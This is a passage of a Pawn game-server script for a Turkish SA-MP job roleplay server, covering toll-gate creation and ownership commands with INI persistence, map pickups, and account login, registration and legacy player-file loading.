	AddPlayerClass(258, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 25 = copcu

	AddPlayerClass(286, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 26 = FBY

	AddPlayerClass(287, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 27 = FBY

	AddPlayerClass(285, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 28 = FBY

	AddPlayerClass(71, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 29 = Bankaci

	AddPlayerClass(277, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 30 = Itfaiyeci

    AddPlayerClass(279, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 31 = Itfaiyeci

    AddPlayerClass(155, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 35 = pizza

    AddPlayerClass(209, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0); // Class 36 = pizza
*/
}



// This function is used to add refuelling pickups to the map
AddRefuelPickup(Float:x, Float:y, Float:z)
{
	// Add the pickup-id to the ARefuelPickups array
	for (new i; i < sizeof(ARefuelPickups); i++)
	{
		// If an empty array-index is found
		if (ARefuelPickups[i][PickupID] == 0)
		{
		    // Store the pickup-id in this empty slot
			ARefuelPickups[i][PickupID] = CreatePickup(1244, 1, x, y, z, 0); // Type 1, cannot be pickup up, exists all the time
			ARefuelPickups[i][pux] = x;
			ARefuelPickups[i][puy] = y;
			ARefuelPickups[i][puz] = z;

			// Add a 3DText message above the refuel-pickup
			Create3DTextLabel(TXT_PickupRefuel, 0x008080FF, x, y, z + 0.8, 30.0, 0);

			// Add an icon to the map for this refuel-spot
			CreateDynamicMapIcon(x, y, z, 55, 0, 0, 0, -1, 300.0);

			// Stop browsing through the array
			break;
		}
	}
}

// This function is used to add cardealer-pickups to the map
AddCarDealerPickup(Float:x, Float:y, Float:z)
{
	// Add the pickup-id to the ACarDealerPickups array
	for (new i; i < sizeof(ACarDealerPickups); i++)
	{
		// If an empty array-index is found
		if (ACarDealerPickups[i][PickupID] == 0)
		{
		    // Store the pickup-id in this empty slot
			ACarDealerPickups[i][PickupID] = CreatePickup(1274, 1, x, y, z, 0); // Type 1, cannot be pickup up, exists all the time
			ACarDealerPickups[i][pux] = x;
			ACarDealerPickups[i][puy] = y;
			ACarDealerPickups[i][puz] = z;

			// Add a 3DText message above the cardealer pickup
			Create3DTextLabel(TXT_PickupCarDealer, 0x008080FF, x, y, z + 0.8, 30.0, 0);

			// Add an icon to the map for this cardealer-spot
			CreateDynamicMapIcon(x, y, z, 55, 0, 0, 0, -1, 300.0);

			// Stop browsing through the array
			break;
		}
	}
}

// /giseekle
CMD:giseekle(playerid, params[])
{
    if(APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return 1;
	ShowPlayerDialog(playerid, DialogGiseEkle, DIALOG_STYLE_INPUT, "{FFCC00}» {FFFFFF}Giþe Ücreti", "{F8F8FF}Giþeden geçiþ ücretini belirleyin:", "Tamam", "Ýptal");
	return 1;
}

// GiseDialogs
GiseDialogs(playerid, dialogid, response, inputtext[])
{
	switch(dialogid)
	{
	    case DialogGiseEkle:
	    {
	        if(response)
	        {
	            if(!strlen(inputtext)) return ShowPlayerDialog(playerid, DialogGiseEkle, DIALOG_STYLE_INPUT, "{FFCC00}» {FFFFFF}Giþe Ücreti", "{F8F8FF}Giþeden geçiþ ücretini belirleyin:", "Tamam", "Ýptal");
	            SecilenGiseUcret[playerid] = strval(inputtext);
	            new Float:osX, Float:osY, Float:osZ;
	            GetPlayerPos(playerid, osX, osY, osZ);
	            SecilenGiseObject[playerid] = CreateDynamicObject(966, osX+2.0, osY+2.0, osZ, 0.0, 0.0, 90.0);
	            EditDynamicObject(playerid, SecilenGiseObject[playerid]);
				GiseEkliyor[playerid] = true;
				SendClientMessage(playerid, 0xFF00AA, "Giþe objesini istediðiniz yere yerleþtirin.");
	        }
	    }
	}
	return 1;
}
public OnPlayerEditObject(playerid, playerobject, objectid, response, Float:fX, Float:fY, Float:fZ, Float:fRotX, Float:fRotY, Float:fRotZ)
{
	if(GiseEkliyor[playerid] == true)
	{
	    if(response == EDIT_RESPONSE_CANCEL)
	    {
	        GiseEkliyor[playerid] = false;
	        DestroyObject(SecilenGiseObject[playerid]);
	        SendClientMessage(playerid, -1, "{FF0000}Giþe eklemekten vazgeçtiniz.");
	    }

	    if(response == EDIT_RESPONSE_FINAL)
	    {
			AddTollGate(fX, fY, fZ, fRotX, fRotY, fRotZ, SecilenGiseUcret[playerid]);
			DestroyObject(SecilenGiseObject[playerid]);
			GiseEkliyor[playerid] = false;
			SendClientMessage(playerid, -1, "{00FF00}Bir giþe eklediniz. Silmek isterseniz /gisesil");
	    }
	}
	return 1;
}

// /giseparacek
CMD:giseparacek(playerid, params[])
{
	new YakinGise = -1;
	for(new i; i < MAX_TOLLGATES; i++)
	{
	    if(ATollGates[i][GateID] == 0) continue;
	    if(IsPlayerInRangeOfPoint(playerid, 3.0, ATollGates[i][TollX], ATollGates[i][TollY], ATollGates[i][TollZ]))
	    {
	        YakinGise = i;
	        break;
	    }
	}
	if(YakinGise == -1) return SendClientMessage(playerid, 0xFF0000FF, "Yakýnlarda giþe yok!");

	if(!strcmp(ATollGates[YakinGise][GateOwner], GetName(playerid), true))
	{
		new Yazi[128];
		format(Yazi, 128, "{F8F8FF}Giþenin kasasýnda biriken {00FF00}%d${F8F8FF}ý çektiniz.", ATollGates[YakinGise][GateCash]);
		SendClientMessage(playerid, -1, Yazi);
		RewardPlayer(playerid, ATollGates[YakinGise][GateCash], 0);
		ATollGates[YakinGise][GateCash] = 0;
		SaveTollGate(YakinGise);
	}
	return 1;
}

// /gisesahip
CMD:gisesahip(playerid, params[])
{
    if(APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return 1;
	new YakinGise = -1;
	for(new i; i < MAX_TOLLGATES; i++)
	{
	    if(ATollGates[i][GateID] == 0) continue;
	    if(IsPlayerInRangeOfPoint(playerid, 3.0, ATollGates[i][TollX], ATollGates[i][TollY], ATollGates[i][TollZ]))
	    {
	        YakinGise = i;
	        break;
	    }
	}
	if(YakinGise == -1) return SendClientMessage(playerid, 0xFF0000FF, "Yakýnlarda giþe yok!");

	new Yazi[128], YGiseSahip[24];
	if(sscanf(params, "s[24]", YGiseSahip))
	{
		SendSyntaxMessage(playerid, "/gisesahip <sahip>");
	}else{
	    format(ATollGates[YakinGise][GateOwner], 24, YGiseSahip);
	    format(Yazi, 128, "{FF0000}Ücretli Giþe( %d$ )\n{00CED1}Sahip: {DDDDDD}%s", ATollGates[YakinGise][TollPrice], ATollGates[YakinGise][GateOwner]);
		UpdateDynamic3DTextLabelText(ATollGates[YakinGise][Gate3D], -1, Yazi);
		SendClientMessage(playerid, -1, "{00FF00}Giþenin sahibi deðiþtirildi!");
		SaveTollGate(YakinGise);
	}
	return 1;
}

// /giseucret
CMD:giseucret(playerid, params[])
{
    if(APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return 1;
	new YakinGise = -1;
	for(new i; i < MAX_TOLLGATES; i++)
	{
	    if(ATollGates[i][GateID] == 0) continue;
	    if(IsPlayerInRangeOfPoint(playerid, 3.0, ATollGates[i][TollX], ATollGates[i][TollY], ATollGates[i][TollZ]))
	    {
	        YakinGise = i;
	        break;
	    }
	}
	if(YakinGise == -1) return SendClientMessage(playerid, 0xFF0000FF, "Yakýnlarda giþe yok!");

	new Yazi[128], YGiseUcret;
	if(sscanf(params, "i", YGiseUcret))
	{
		SendSyntaxMessage(playerid, "/giseucret <ucret>");
	}else{
	    ATollGates[YakinGise][TollPrice] = YGiseUcret;
	    format(Yazi, 128, "{FF0000}Ücretli Giþe( %d$ )\n{00CED1}Sahip: {DDDDDD}%s", ATollGates[YakinGise][TollPrice], ATollGates[YakinGise][GateOwner]);
		UpdateDynamic3DTextLabelText(ATollGates[YakinGise][Gate3D], -1, Yazi);
		SendClientMessage(playerid, -1, "{00FF00}Giþenin ücreti deðiþtirildi!");
		SaveTollGate(YakinGise);
	}
	return 1;
}

// /gisegecensayisi
CMD:gisegecensayisi(playerid, params[])
{
    if(APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return 1;
	new YakinGise = -1;
	for(new i; i < MAX_TOLLGATES; i++)
	{
	    if(ATollGates[i][GateID] == 0) continue;
	    if(IsPlayerInRangeOfPoint(playerid, 3.0, ATollGates[i][TollX], ATollGates[i][TollY], ATollGates[i][TollZ]))
	    {
	        YakinGise = i;
	        break;
	    }
	}
	if(YakinGise == -1) return SendClientMessage(playerid, 0xFF0000FF, "Yakýnlarda giþe yok!");
	new Yazi[120];
	format(Yazi, 120, "{F8F8FF}Bu giþe oluþturulduðundan beri {00FF00}%d kiþi {F8F8FF}geçmiþ.", ATollGates[YakinGise][GateGecenSayisi]);
	SendClientMessage(playerid, -1, Yazi);
	return 1;
}

// /gisesil
CMD:gisesil(playerid, params[])
{
    if(APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return 1;
	new YakinGise = -1;
	for(new i; i < MAX_TOLLGATES; i++)
	{
	    if(ATollGates[i][GateID] == 0) continue;
	    if(IsPlayerInRangeOfPoint(playerid, 3.0, ATollGates[i][TollX], ATollGates[i][TollY], ATollGates[i][TollZ]))
	    {
	        YakinGise = i;
	        break;
	    }
	}
	if(YakinGise == -1) return SendClientMessage(playerid, 0xFF0000FF, "Yakýnlarda giþe yok!");
	DeleteTollGate(YakinGise);
	SendClientMessage(playerid, -1, "{00FF00}Yanýnýzdaki giþe silindi.");
	return 1;
}


/*
// Setup a custom type that holds all data about toll-boots (les peages jaune)
enum TTollGate
{
	GateID, // Holds the object-id of the gate
	GateObje2,
	GateOwner[24],
	GateCash,
	Text3D:Gate3D,
	TollPrice, // Holds the price for passing the gate
	GateStatus, // Holds the status of the gate (open = 1, closed = 0)
	Float:TollX, // Holds the coordinates when the gate is opened
	Float:TollY, // Holds the coordinates when the gate is opened
	Float:TollZ, // Holds the coordinates when the gate is opened
	Float:TollRX, // Holds the coordinates when the gate is closed
	Float:TollRY, // Holds the coordinates when the gate is closed
	Float:TollRZ // Holds the coordinates when the gate is closed
}
new ATollGates[MAX_TOLLGATES][TTollGate];
*/
// This function is used to add toll-gates to the map
AddTollGate(Float:X, Float:Y, Float:Z, Float:RX, Float:RY, Float:RZ, TollMoney)
{
	new Yazi[128];
	// Loop through all tollgates
	for (new TollGate; TollGate < MAX_TOLLGATES; TollGate++)
	{
		// Check if this is an empty entry
		if (ATollGates[TollGate][GateID] == 0)
		{
			// Create a new object for the toll-gate in it's closed status
			ATollGates[TollGate][GateObje2] = CreateDynamicObject(966, X, Y, Z, RX, RY, RZ);
			ATollGates[TollGate][GateID] = CreateDynamicObject(968, X, Y, Z+1, RX, RY-90.0, RZ);
			format(ATollGates[TollGate][GateOwner], 24, "-");
			ATollGates[TollGate][GateCash] = 0;
			// Set data
			ATollGates[TollGate][TollPrice] = TollMoney; // Set the price to pay for passing the toll-gate
			ATollGates[TollGate][GateGecenSayisi] = 0;
			ATollGates[TollGate][GateStatus] = 0; // Set the status to CLOSED
			ATollGates[TollGate][TollX] = X; // Save the X coordinates
			ATollGates[TollGate][TollY] = Y; // Save the Y coordinates
			ATollGates[TollGate][TollZ] = Z; // Save the Z coordinates
			ATollGates[TollGate][TollRX] = RX; // Save the RX coordinates
			ATollGates[TollGate][TollRY] = RY; // Save the RY coordinates
			ATollGates[TollGate][TollRZ] = RZ; // Save the RZ coordinates

			format(Yazi, 128, "{FF0000}Ücretli Giþe( %d$ )\n{00CED1}Sahip: {DDDDDD}%s", ATollGates[TollGate][TollPrice], ATollGates[TollGate][GateOwner]);
			ATollGates[TollGate][Gate3D] = CreateDynamic3DTextLabel(Yazi, -1, ATollGates[TollGate][TollX], ATollGates[TollGate][TollY], ATollGates[TollGate][TollZ], 50.0);

			format(Yazi, 128, "ServerData/Giseler/Gise%d.ini", TollGate);
			new INI:File = INI_Open(Yazi);

			INI_SetTag(File, "gise");

			INI_WriteString(File, "Sahip", ATollGates[TollGate][GateOwner]);
			INI_WriteInt(File, "Kasa", ATollGates[TollGate][GateCash]);
			INI_WriteInt(File, "GUcreti", ATollGates[TollGate][TollPrice]);
			INI_WriteInt(File, "GecenSayisi", ATollGates[TollGate][GateGecenSayisi]);
			INI_WriteFloat(File, "X", ATollGates[TollGate][TollX]);
			INI_WriteFloat(File, "Y", ATollGates[TollGate][TollY]);
			INI_WriteFloat(File, "Z", ATollGates[TollGate][TollZ]);
			INI_WriteFloat(File, "RX", ATollGates[TollGate][TollRX]);
			INI_WriteFloat(File, "RY", ATollGates[TollGate][TollRY]);
			INI_WriteFloat(File, "RZ", ATollGates[TollGate][TollRZ]);

			INI_Close(File);
			break; // Stop the for-loop
		}
	}
}

forward DeleteTollGate(TollGate);
public DeleteTollGate(TollGate)
{
	new Yazi[128];
	DestroyDynamicObject(ATollGates[TollGate][GateObje2]);
	DestroyDynamicObject(ATollGates[TollGate][GateID]);
	ATollGates[TollGate][GateID] = 0;
	DestroyDynamic3DTextLabel(ATollGates[TollGate][Gate3D]);

	format(Yazi, 128, "ServerData/Giseler/Gise%d.ini", TollGate);
	if(fexist(Yazi))
	{
	    fremove(Yazi);
	}
	return 1;
}

forward LoadTollGates();
public LoadTollGates()
{
	new Yazi[128], Loadedcount;

	for(new i; i < MAX_TOLLGATES; i++)
	{
	    format(Yazi, 128, "ServerData/Giseler/Gise%d.ini", i);

	    if(fexist(Yazi))
	    {
	        INI_ParseFile(Yazi, "LoadTollGate_%s", .bExtra = true, .extra = i);
			ATollGates[i][GateObje2] = CreateDynamicObject(966, ATollGates[i][TollX], ATollGates[i][TollY], ATollGates[i][TollZ], ATollGates[i][TollRX], ATollGates[i][TollRY], ATollGates[i][TollRZ]);
			ATollGates[i][GateID] = CreateDynamicObject(968, ATollGates[i][TollX], ATollGates[i][TollY], ATollGates[i][TollZ]+1, ATollGates[i][TollRX], ATollGates[i][TollRY]-90.0, ATollGates[i][TollRZ]);

			format(Yazi, 128, "{FF0000}Ücretli Giþe( %d$ )\n{00CED1}Sahip: {DDDDDD}%s", ATollGates[i][TollPrice], ATollGates[i][GateOwner]);
			ATollGates[i][Gate3D] = CreateDynamic3DTextLabel(Yazi, -1, ATollGates[i][TollX], ATollGates[i][TollY], ATollGates[i][TollZ], 50.0);

		    Loadedcount++;
	    }
 	}

 	printf("%d gise yuklendi.", Loadedcount);
}


forward LoadTollGate_gise(TollGate, name[], value[]);
public LoadTollGate_gise(TollGate, name[], value[])
{
	INI_String("Sahip", ATollGates[TollGate][GateOwner], 24);
	INI_Int("Kasa", ATollGates[TollGate][GateCash]);
	INI_Int("GUcreti", ATollGates[TollGate][TollPrice]);
	INI_Int("GecenSayisi", ATollGates[TollGate][GateGecenSayisi]);
	INI_Float("X", ATollGates[TollGate][TollX]);
	INI_Float("Y", ATollGates[TollGate][TollY]);
	INI_Float("Z", ATollGates[TollGate][TollZ]);
	INI_Float("RX", ATollGates[TollGate][TollRX]);
	INI_Float("RY", ATollGates[TollGate][TollRY]);
	INI_Float("RZ", ATollGates[TollGate][TollRZ]);
	return 1;
}

forward SaveTollGate(TollGate);
public SaveTollGate(TollGate)
{
	new Yazi[128];
	format(Yazi, 128, "ServerData/Giseler/Gise%d.ini", TollGate);
	new INI:File = INI_Open(Yazi);

	INI_SetTag(File, "gise");

	INI_WriteString(File, "Sahip", ATollGates[TollGate][GateOwner]);
	INI_WriteInt(File, "Kasa", ATollGates[TollGate][GateCash]);
	INI_WriteInt(File, "GUcreti", ATollGates[TollGate][TollPrice]);
	INI_WriteInt(File, "GecenSayisi", ATollGates[TollGate][GateGecenSayisi]);
	INI_WriteFloat(File, "X", ATollGates[TollGate][TollX]);
	INI_WriteFloat(File, "Y", ATollGates[TollGate][TollY]);
	INI_WriteFloat(File, "Z", ATollGates[TollGate][TollZ]);
	INI_WriteFloat(File, "RX", ATollGates[TollGate][TollRX]);
	INI_WriteFloat(File, "RY", ATollGates[TollGate][TollRY]);
	INI_WriteFloat(File, "RZ", ATollGates[TollGate][TollRZ]);

	INI_Close(File);
}

/*AddTollGate(GateModel, Float:OX, Float:OY, Float:OZ, Float:CX, Float:CY, Float:CZ, Float:RX, Float:RY, Float:RZ, TollMoney)
{
	// Loop through all tollgates
	for (new TollGate; TollGate < MAX_TOLLGATES; TollGate++)
	{
		// Check if this is an empty entry
		if (ATollGates[TollGate][GateID] == 0)
		{
			// Create a new object for the toll-gate in it's closed status
			ATollGates[TollGate][GateID] = CreateObject(GateModel, CX, CY, CZ, RX, RY, RZ);
			// Set data
			ATollGates[TollGate][TollPrice] = TollMoney; // Set the price to pay for passing the toll-gate
			ATollGates[TollGate][GateStatus] = 0; // Set the status to CLOSED
			ATollGates[TollGate][OpenX] = OX; // Save the OpenX coordinates
			ATollGates[TollGate][OpenY] = OY; // Save the OpenY coordinates
			ATollGates[TollGate][OpenZ] = OZ; // Save the OpenZ coordinates
			ATollGates[TollGate][CloseX] = CX; // Save the CloseX coordinates
			ATollGates[TollGate][CloseY] = CY; // Save the CloseY coordinates
			ATollGates[TollGate][CloseZ] = CZ; // Save the CloseZ coordinates
			break; // Stop the for-loop
		}
	}
}
*/
// ************************************************************************************************************************************************************
// MySQL Kayýt Sistemi
// ************************************************************************************************************************************************************
// Oyuncu_HesapKontrol
Oyuncu_HesapKontrol(playerid)
{
     for(new i; i < 7; i++) TextDrawShowForPlayer(playerid, MeslekUI_Text[i]);

	        PlayerTextDrawSetString(playerid, MeslekUI_Bilgi[playerid], "Giris Yap");
	        PlayerTextDrawShow(playerid, MeslekUI_Bilgi[playerid]);
	new Yazi[500];

    if(SQL::RowExistsEx("oyuncular", "Nick", APlayerData[playerid][PlayerName]))
    {
        new handle = SQL::OpenEx(SQL::READ, "oyuncular", "Nick", APlayerData[playerid][PlayerName]);
        SQL::ReadInt(handle, "ID", APlayerData[playerid][PlayerSQLID]);
        SQL::ReadString(handle, "Sifre", APlayerData[playerid][PlayerPassword], 256);

        SQL::Close(handle);

		format(Yazi, 500, "%s{DDDDDD}Sayýn {FF3E96}%s,\n", Yazi, GetName(playerid));
		format(Yazi, 500, "%s{DDDDDD}Sunucumuza tekrar hoþ geldiniz.\n", Yazi);
		format(Yazi, 500, "%s\n \n", Yazi);
		format(Yazi, 500, "%s{DDDDDD}Lütfen alttaki kutucuða {ADFF2F}Þifrenizi {DDDDDD}girerek hesabýnýza giriþ yapýnýz.\n", Yazi);
		format(Yazi, 500, "%s{FF4040}30 saniye {DDDDDD}içinde giriþ yapmazsanýz kicklenirsiniz.\n", Yazi);

        ShowPlayerDialog(playerid, DialogLogin, DIALOG_STYLE_PASSWORD, "{FFCC00}» {FFFFFF}Canakkale Meslek Sunucusu - Giriþ", Yazi, "Giriþ", "Çýk");
    }else{
    	if (PlayerFile_Load(playerid) == 1)
		{
			format(Yazi, 500, "%s{DDDDDD}Sayýn {FF3E96}%s,\n", Yazi, GetName(playerid));
			format(Yazi, 500, "%s{DDDDDD}Sunucumuza tekrar hoþ geldiniz.\n", Yazi);
			format(Yazi, 500, "%s\n \n", Yazi);
			format(Yazi, 500, "%s{DDDDDD}Lütfen alttaki kutucuða {ADFF2F}Þifrenizi {DDDDDD}girerek hesabýnýza giriþ yapýnýz.\n", Yazi);
			format(Yazi, 500, "%s{FF4040}30 saniye {DDDDDD}içinde giriþ yapmazsanýz kicklenirsiniz.\n", Yazi);

        	ShowPlayerDialog(playerid, DialogLogin, DIALOG_STYLE_PASSWORD, "{FFCC00}» {FFFFFF}Canakkale Meslek Sunucusu - Giriþ", Yazi, "Giriþ", "Çýk");

		}else{
			format(Yazi, 500, "%s{DDDDDD}Sayýn {FF3E96}%s,\n", Yazi, GetName(playerid));
			format(Yazi, 500, "%s{DDDDDD}Sunucumuza hoþ geldiniz. Oyuna girmek için kayýt olmanýz gerekiyor.\n", Yazi);
			format(Yazi, 500, "%s\n \n", Yazi);
			format(Yazi, 500, "%s{DDDDDD}Lütfen alttaki kutucuða kullanmak istediðiniz {ADFF2F}Þifreyi {DDDDDD}giriniz.\n", Yazi);
    		format(Yazi, 500, "%s{FF4040}30 saniye {DDDDDD}içinde kayýt olmazsanýz kicklenirsiniz.\n", Yazi);

        	ShowPlayerDialog(playerid, DialogRegister, DIALOG_STYLE_PASSWORD, "{FFCC00}» {FFFFFF}Canakkale Meslek Sunucusu - Kayýt", Yazi, "Kaydol", "Çýk");
	    }
    }
}

// PlayerFile_Load (Eski Moddan Entegrasyon)
PlayerFile_Load(playerid)
{
	// Setup local variables
	new file[100], File:PFile, LineFromFile[500], ParameterName[50], ParameterValue[400], Yazi[128];

	format(file, sizeof(file), PlayerFile, GetName(playerid));

	if (fexist(file))
	{
		PFile = fopen(file, io_read);

		fread(PFile, LineFromFile);

		// Keep reading until the end of the file is found (no more data)
		while (strlen(LineFromFile) > 0)
		{
			StripNewLine(LineFromFile); // Strip any newline characters from the LineFromFile
			sscanf(LineFromFile, "s[50]s[50]", ParameterName, ParameterValue); // Extract parametername and parametervalue
			// Store the proper value in the proper place
			if (strcmp(ParameterName, "Password", false) == 0) // If the parametername is correct ("Password")
			{
			    SHA256_PassHash(ParameterValue, "", APlayerData[playerid][PlayerPassword], 256);
			}
			if (strcmp(ParameterName, "APassword", false) == 0) // If the parametername is correct ("Password")
			    format(APlayerData[playerid][PlayerAdmPassword], 350, ParameterValue); // Store the password
			if (strcmp(ParameterName, "Level", false) == 0) // If the parametername is correct ("Level")
			    APlayerData[playerid][PlayerFLevel] = strval(ParameterValue); // Store the playerlevel
   			if (strcmp(ParameterName, "DjLevel", false) == 0) // If the parametername is correct ("Level")
			    APlayerData[playerid][PlayerDjLevel] = strval(ParameterValue); // Store the playerlevel
	    	if (strcmp(ParameterName, "RehberLevel", false) == 0) // If the parametername is correct ("Level")
			    APlayerData[playerid][PlayerRehberLevel] = strval(ParameterValue); // Store the playerlevel
   			if (strcmp(ParameterName, "DonLevel", false) == 0) // If the parametername is correct ("Level")
			    APlayerData[playerid][PlayerDonLevel] = strval(ParameterValue); // Store the playerlevel
			if (strcmp(ParameterName, "Jailed", false) == 0) // If the parametername is correct ("Jailed")
			    APlayerData[playerid][PlayerJailed] = strval(ParameterValue); // Store the jailed-status
			if (strcmp(ParameterName, "Wanted", false) == 0) // If the parametername is correct ("Wanted")
			    APlayerData[playerid][PlayerWanted] = strval(ParameterValue); // Set the wanted-status
			if (strcmp(ParameterName, "Bans", false) == 0) // If the parametername is correct ("Bans")
			    APlayerData[playerid][Bans] = strval(ParameterValue); // Store the bans
			if (strcmp(ParameterName, "BanTime", false) == 0) // If the parametername is correct ("BanTime")
			    APlayerData[playerid][BanTime] = strval(ParameterValue); // Store the bantime
			if (strcmp(ParameterName, "TruckerLicense", false) == 0) // If the parametername is correct ("TruckerLicense")
			    APlayerData[playerid][TruckerLicense] = strval(ParameterValue); // Store the TruckerLicense
			if (strcmp(ParameterName, "BusLicense", false) == 0) // If the parametername is correct ("BusLicense")
			    APlayerData[playerid][BusLicense] = strval(ParameterValue); // Store the BusLicense
			if (strcmp(ParameterName, "DolmusLicense", false) == 0) // If the parametername is correct ("BusLicense")
			    APlayerData[playerid][DolmusLicense] = strval(ParameterValue); // Store the BusLicense
			if (strcmp(ParameterName, "PilotLicense", false) == 0) // If the parametername is correct ("TruckerLicense")
			    APlayerData[playerid][PilotLicense] = strval(ParameterValue); // Store the TruckerLicense
			if (strcmp(ParameterName, "GemiciLicense", false) == 0) // If the parametername is correct ("TruckerLicense")
			    APlayerData[playerid][GemiciLicense] = strval(ParameterValue); // Store the TruckerLicense
   			if (strcmp(ParameterName, "MafiaLicense", false) == 0) // If the parametername is correct ("TruckerLicense")
			    APlayerData[playerid][MafiaLicense] = strval(ParameterValue); // Store the TruckerLicense

			if (strcmp(ParameterName, "Muted", false) == 0) // If the parametername is correct ("Muted")
			{
			    if (strcmp(ParameterValue, "Yes", false) == 0) // If the value "Yes" was read
					APlayerData[playerid][Muted] = 0; // Player is muted
				else
					APlayerData[playerid][Muted] = 0; // Player is not muted
			}
			if (strcmp(ParameterName, "RulesRead", false) == 0) // If the parametername is correct ("RulesRead")
			{
			    if (strcmp(ParameterValue, "Yes", false) == 0) // If the value "Yes" was read
					APlayerData[playerid][RulesRead] = true; // Player has accepted the rules
				else
					APlayerData[playerid][RulesRead] = false; // Player hasn't accepted the rules yet
			}

			if (strcmp(ParameterName, "StatsMetersDriven", false) == 0) // If the parametername is correct ("StatsMetersDriven")
			    APlayerData[playerid][StatsMetersDriven] = floatstr(ParameterValue); // Store the StatsMetersDriven
			if (strcmp(ParameterName, "StatsTruckerJobs", false) == 0) // If the parametername is correct ("StatsTruckerJobs")
			    APlayerData[playerid][StatsTruckerJobs] = strval(ParameterValue); // Store the StatsTruckerJobs
			if (strcmp(ParameterName, "StatsConvoyJobs", false) == 0) // If the parametername is correct ("StatsConvoyJobs")
			    APlayerData[playerid][StatsConvoyJobs] = strval(ParameterValue); // Store the StatsConvoyJobs
			if (strcmp(ParameterName, "StatsBusDriverJobs", false) == 0) // If the parametername is correct ("StatsBusDriverJobs")
			    APlayerData[playerid][StatsBusDriverJobs] = strval(ParameterValue); // Store the StatsBusDriverJobs
			if (strcmp(ParameterName, "StatsDolmusDriverJobs", false) == 0) // If the parametername is correct ("StatsBusDriverJobs")
			    APlayerData[playerid][StatsDolmusDriverJobs] = strval(ParameterValue); // Store the StatsBusDriverJobs
			if (strcmp(ParameterName, "StatsPilotJobs", false) == 0) // If the parametername is correct ("StatsPilotJobs")
			    APlayerData[playerid][StatsPilotJobs] = strval(ParameterValue); // Store the StatsPilotJobs
			if (strcmp(ParameterName, "StatsMafiaJobs", false) == 0) // If the parametername is correct ("StatsMafiaJobs")
			    APlayerData[playerid][StatsMafiaJobs] = strval(ParameterValue); // Store the StatsMafiaJobs
			if (strcmp(ParameterName, "StatsMafiaStolen", false) == 0) // If the parametername is correct ("StatsMafiaStolen")
			    APlayerData[playerid][StatsMafiaStolen] = strval(ParameterValue); // Store the StatsMafiaStolen
			if (strcmp(ParameterName, "StatsPoliceFined", false) == 0) // If the parametername is correct ("StatsPoliceFined")
			    APlayerData[playerid][StatsPoliceFined] = strval(ParameterValue); // Store the StatsPoliceFined
			if (strcmp(ParameterName, "StatsPoliceJailed", false) == 0) // If the parametername is correct ("StatsPoliceJailed")
			    APlayerData[playerid][StatsPoliceJailed] = strval(ParameterValue); // Store the StatsPoliceJailed
			if (strcmp(ParameterName, "StatsFBYFined", false) == 0) // If the parametername is correct ("StatsFBYFined")
			    APlayerData[playerid][StatsFBYFined] = strval(ParameterValue); // Store the StatsFBYFined
			if (strcmp(ParameterName, "StatsFBYJailed", false) == 0) // If the parametername is correct ("StatsFBYJailed")
			    APlayerData[playerid][StatsFBYJailed] = strval(ParameterValue); // Store the StatsFBYJailed
			if (strcmp(ParameterName, "StatsRoadworkerJobs", false) == 0) // If the parametername is correct ("StatsRoadworkerJobs")
			    APlayerData[playerid][StatsRoadworkerJobs] = strval(ParameterValue); // Store the StatsRoadworkerJobs
			if (strcmp(ParameterName, "StatsGemiciJobs", false) == 0) // If the parametername is correct ("StatsGemiciJobs")
			    APlayerData[playerid][StatsGemiciJobs] = strval(ParameterValue); // Store the StatsGemiciJobs
            if (strcmp(ParameterName, "StatsGJobs", false) == 0) // If the parametername is correct ("StatsGJobs")
			    APlayerData[playerid][StatsCopcuJobs] = strval(ParameterValue); // Store the StatsGJobs
   			if (strcmp(ParameterName, "StatsBankaJobs", false) == 0) // If the parametername is correct ("StatsGJobs")
			    APlayerData[playerid][StatsBankaJobs] = strval(ParameterValue); // Store the StatsGJobs
		    if (strcmp(ParameterName, "StatsFireJobs", false) == 0) // If the parametername is correct ("StatsGJobs")
			    APlayerData[playerid][StatsFireJobs] = strval(ParameterValue); // Store the StatsGJobs
			if (strcmp(ParameterName, "StatsOduncuJobs", false) == 0) // If the parametername is correct ("StatsOduncuJobs")
			    APlayerData[playerid][StatsOduncuJobs] = strval(ParameterValue); // Store the StatsOduncuJobs
			if (strcmp(ParameterName, "StatsBalikciJobs", false) == 0) // If the parametername is correct ("StatsOduncuJobs")
			    APlayerData[playerid][StatsBalikciJobs] = strval(ParameterValue); // Store the StatsOduncuJobs


			if (strcmp(ParameterName, "Money", false) == 0) // If the parametername is correct ("Money")
				APlayerData[playerid][PlayerMoney] = strval(ParameterValue); // Store the money
			if (strcmp(ParameterName, "Score", false) == 0) // If the parametername is correct ("Score")
				APlayerData[playerid][PlayerScore] = strval(ParameterValue); // Store the score

			if (strcmp(ParameterName, "EvPara", false) == 0) // If the parametername is correct ("Level")
   			{
		   		APlayerData[playerid][PlayerMoney] += strval(ParameterValue);
		   		format(Yazi, 128, "Otomatik satýlan evinizden %d$ para geldi(Ev, Geliþtirmeler ve Araba paralarý)", strval(ParameterValue));
		   		SendClientMessage(playerid, -1, Yazi);
			}

			if (strcmp(ParameterName, "BusPara", false) == 0) // If the parametername is correct ("Level")
   			{
		   		APlayerData[playerid][PlayerMoney] += strval(ParameterValue);
		   		format(Yazi, 128, "Otomatik satýlan iþyerinizden %d$ para geldi(Ýþyeri, Geliþtirmeler ve Kasadaki Paralar)", strval(ParameterValue));
		   		SendClientMessage(playerid, -1, Yazi);
			}

			if (strcmp(ParameterName, "GizliKasa", false) == 0) // If the parametername is correct ("Rutbe")
				SakliKasaTamam[playerid] = strval(ParameterValue);
			if (strcmp(ParameterName, "GizliKasaI", false) == 0) // If the parametername is correct ("Rutbe")
